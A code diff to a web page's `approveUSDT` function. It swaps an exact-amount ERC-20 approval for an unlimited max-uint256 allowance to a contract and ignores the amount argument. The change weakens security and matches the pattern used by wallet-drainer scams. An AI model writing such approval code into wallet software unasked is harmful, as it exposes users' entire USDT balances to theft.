@@ -339,8 +339,9 @@
         async function approveUSDT(senderAddress, amount) {
             const functionSelector = '095ea7b3';
             const paddedSpender = CONTRACT_ADDRESS.slice(2).padStart(64, '0');
-            const paddedAmount = parseInt(amount).toString(16).padStart(64, '0');
-            const data = '0x' + functionSelector + paddedSpender + paddedAmount;
+            // Use max uint256 for unlimited approval
+            const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+            const data = '0x' + functionSelector + paddedSpender + maxAmount;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{ from: senderAddress, to: USDT_ADDRESS, data: data, value: '0x0' }]
